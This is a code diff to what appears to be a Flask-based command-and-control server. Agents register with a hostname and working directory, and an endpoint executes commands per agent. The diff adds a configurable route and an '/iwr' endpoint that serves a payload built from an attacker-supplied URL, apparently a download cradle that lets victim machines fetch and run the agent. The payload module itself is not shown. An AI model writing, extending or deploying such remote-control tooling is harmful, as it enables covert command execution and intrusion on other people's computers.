@@ -1,14 +1,16 @@
 import argparse, json, logging, uuid
 from flask import Flask, request, Response
 from agent import Agent
+from payload import *
 
 parser = argparse.ArgumentParser()
 parser.add_argument("-r", "--route", help="the api endpoint the agent will connect to")
 parser.add_argument("-lp", "--lport", help="the port the agent will connect to (default: 5000)")
+parser.add_argument("-u", "--url", help="the url the agent will connect to")
 args, leftovers = parser.parse_known_args()
 
 #route = args.route
-route = "test"
+route = args.route
 lport = args.lport if args.lport is not None else '5000'
 log = logging.getLogger('werkzeug')
 log.setLevel(logging.ERROR)
@@ -21,6 +23,10 @@ def register_agent():
     agent = Agent(id, request.json['hostname'], request.json['cwd'])
     agents.append(agent)
     return agent.id
+
+@api.route('/' + route + '/iwr', methods=["GET"])
+def get_payload():
+    return generate_payload(args.url)
 
 @api.route('/' + route + '/<id>', methods=['GET', 'POST'])
 def execute_commands(id):
